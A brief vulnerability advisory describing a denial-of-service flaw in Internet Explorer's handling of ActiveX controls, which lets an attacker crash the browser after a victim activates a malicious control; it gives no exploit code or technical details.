Microsoft Internet Explorer is prone to a denial-of-service vulnerability because it fails to handle ActiveX controls properly.

This issue is triggered when an attacker convinces a victim user to activate a malicious ActiveX control.

Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.
